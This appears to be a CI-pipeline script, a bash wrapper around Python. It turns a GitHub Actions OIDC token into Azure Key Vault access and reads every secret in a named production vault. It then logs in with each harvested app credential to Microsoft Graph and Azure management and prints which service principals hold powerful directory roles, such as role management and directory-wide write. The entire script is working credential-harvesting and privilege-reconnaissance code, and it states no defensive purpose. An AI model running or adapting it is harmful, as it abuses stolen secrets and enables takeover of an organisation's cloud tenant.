#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, base64, urllib.request, urllib.parse
def http(url, data=None, headers=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
def claims(t):
    p=t.split(".")[1]; p+="="*(-len(p)%4)
    return json.loads(base64.urlsafe_b64decode(p))
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jg(b)["access_token"]
creds={}
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
for s in jg(b).get("value",[]):
    n=s["id"].rsplit("/",1)[-1]
    st2,b2=http(s["id"]+"?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
    try: creds[n]=json.loads(jg(b2).get("value",""))
    except Exception: pass

GRAPH_ROLE={
 "9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30":"Application.Read.All",
 "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9":"Application.ReadWrite.All",
 "06b708a9-e830-4db3-a914-8e69da51d44f":"AppRoleAssignment.ReadWrite.All",
 "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8":"RoleManagement.ReadWrite.Directory",
 "7ab1d382-f21e-4acd-a863-ba3e13f7da61":"Directory.Read.All",
 "19dbc75e-c2e2-444c-a770-ec69d8559fc7":"Directory.ReadWrite.All",
 "df021288-bdef-4463-88db-98f22de89214":"User.Read.All",
 "5b567255-7703-4780-807c-7be8301ae99b":"Group.Read.All",
 "62a82d76-70ea-41e2-9197-370581804d09":"Group.ReadWrite.All",
 "b0afded3-3588-46d8-8b3d-9842eff778da":"AuditLog.Read.All",
 "246dd0d5-5bd0-4def-940b-0421030a5b68":"Policy.Read.All",
 "a82116e5-55eb-4c41-a434-62fe8a61c773":"Sites.FullControl.All",
 "741f803b-c850-494e-b5df-cde7c675a1ca":"User.ReadWrite.All",
 "e12dae10-5a57-4817-b79d-dfbec5348930":"Policy.Read.ApplicationConfiguration",
}
for n,c in creds.items():
    out=[n]
    for scope,label in (("https://graph.microsoft.com/.default","graph"),
                        ("https://management.azure.com/.default","arm")):
        st,b=http(f"https://login.microsoftonline.com/{c.get('tenantId',TEN)}/oauth2/v2.0/token",
          {"client_id":c["appId"],"client_secret":c["clientSecret"],"scope":scope,"grant_type":"client_credentials"})
        t=jg(b).get("access_token")
        if not t:
            out.append(f"{label}=NOTOKEN"); continue
        cl=claims(t)
        roles=cl.get("roles",[])
        if label=="graph":
            named=[GRAPH_ROLE.get(r,r) for r in roles]
            out.append(f"graph oid={cl.get('oid')} app={cl.get('app_displayname')} roles={named}")
        else:
            out.append(f"arm oid={cl.get('oid')}")
    print(" | ".join(out))
    print()
PYEOF
echo "=== done ==="